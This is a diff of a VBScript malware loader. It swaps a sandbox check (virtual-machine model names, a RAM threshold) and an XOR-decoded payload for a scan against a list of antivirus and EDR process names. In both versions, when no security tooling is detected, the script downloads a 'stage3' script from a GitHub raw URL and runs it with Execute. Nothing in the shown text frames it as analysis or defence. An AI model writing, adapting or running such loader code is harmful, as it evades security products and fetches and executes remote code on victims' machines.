@@ -1,58 +1,33 @@
-Dim http, b64, bytes, code, i, bVal, kIdx, xK(7), x, n
-Dim wmi, cs, c, ram, model, isSandbox
+Dim fso, sh, http, code
+Dim wmi, procs, p, avList, re, isAV
 
-isSandbox = False
+isAV = False
 
-' ---- sandbox check: VM model + RAM threshold ----
+' --- AV Process Scan ---
 On Error Resume Next
 Set wmi = GetObject("winmgmts:\\.\root\cimv2")
 If Err.Number = 0 Then
-    Set cs = wmi.ExecQuery("SELECT Model, TotalPhysicalMemory FROM Win32_ComputerSystem")
-    For Each c In cs
-        ram = c.TotalPhysicalMemory
-        model = LCase(c.Model)
-        If InStr(model, "virtual") > 0 Or InStr(model, "vmware") > 0 Or _
-           InStr(model, "vbox") > 0 Or InStr(model, "qemu") > 0 Or _
-           InStr(model, "xen") > 0 Then
-            isSandbox = True
+    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
+    avList = "avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework|MsMpEng|avast|avgsvc|Sophos|SentinelOne|Cylance|CrowdStrike|CSFalcon|Panda|BullGuard|ESET"
+    Set re = New RegExp
+    re.Pattern = avList
+    re.IgnoreCase = True
+    For Each p In procs
+        If re.Test(p.Name) Then
+            isAV = True
         End If
     Next
-    If ram < 2147483648 Then isSandbox = True
 End If
 Err.Clear
 On Error GoTo 0
 
-' ---- decode stage3 and execute, only if not sandbox ----
-If Not isSandbox Then
-
-    xK(0) = 90
-    xK(1) = 59
-    xK(2) = 167
-    xK(3) = 17
-    xK(4) = 205
-    xK(5) = 66
-    xK(6) = 159
-    xK(7) = 6
-
+' --- Fetch and Execute Stage3 ---
+If Not isAV Then
     Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
     http.Open "GET", "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/stage3.txt", False
     http.Send
     If http.Status = 200 Then
-        b64 = http.ResponseText
-        Set x = CreateObject("MSXML2.DOMDocument")
-        Set n = x.createElement("b")
-        n.dataType = "bin.base64"
-        n.text = b64
-        bytes = n.nodeTypedValue
-        kIdx = 0
-        code = ""
-        For i = 1 To LenB(bytes)
-            bVal = AscB(MidB(bytes, i, 1))
-            bVal = bVal Xor xK(kIdx)
-            code = code & Chr(bVal)
-            kIdx = (kIdx + 1) Mod 8
-        Next
+        code = http.ResponseText
         If Len(code) > 0 Then Execute code
     End If
-
 End If
